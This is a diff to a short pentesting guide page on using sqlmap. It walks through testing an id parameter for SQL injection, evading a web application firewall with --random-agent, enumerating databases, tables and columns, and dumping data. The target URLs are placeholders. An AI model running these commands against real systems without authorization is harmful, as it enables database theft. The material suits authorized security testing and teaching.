@@ -1,6 +1,6 @@
-# Automated exploitation
+#  Scanning a webserver with SQLMap
 
-## Attack tree
+## Attack tree 
 
 ```text
 1 Gather information with sqlmap
@@ -14,30 +14,32 @@
 
 ## Examples
 
+Identify a page in the target web application that displays data and note the URL.
 Use a standard HTTP GET based request against a URI with a request parameter (?id=1). This will test different SQL 
 injection methods against the id parameter.
     
-    # sqlmap -u "<target>/<pagename>.php?id=1"
+    # sqlmap -u http://urloftargetpage/page.php?id=1
 
 When blocked by a Web Application Firewall (WAF), try using a different user agent with the `--randomagent` parameter.
 
-    # sqlmap -u "<target>/<pagename>.php?id=1" --random-agent
+    # sqlmap -u http://urloftargetpage/page.php?id=1 --random-agent
 
-List information about the existing databases:
+If SQL injections are successful, the `--dbs` parameter gives information about the database, such as the 
+type of database and the database name.
 
-    # sqlmap -u "<target>/<pagename>.php?id=1" --dbs
+    sqlmap -u http://urloftargetpage/page.php?id=1 --dbs
 
 List information about tables present in a particular database:
 
-    # sqlmap -u "<target>/<pagename>.php?id=1" -D <databasename> --tables
+    # sqlmap -u http://urloftargetpage/page.php?id=1 -D <databasename> --tables
 
 List information about the columns of a particular table:
 
-    # sqlmap -u "<target>/<pagename>.php?id=1" -D <databasename> -T <tablenname> --columns
+    # sqlmap -u http://urloftargetpage/page.php?id=1 -D <databasename> -T <tablenname> --columns
 
-Dump the data:
+Dump data:
 
-    # sqlmap -u "<target>/<pagename>.php?id=1" -D <databasename> -T <tablename> -C <multiple columnnames separated by commas>--dump
+    # sqlmap -u http://urloftargetpage/page.php?id=1 -D <databasename> -T <tablename> -C <multiple columnnames separated by commas>--dump
 
 ## Tools
 * [SQLMap](https://www.kali.org/tools/sqlmap/)
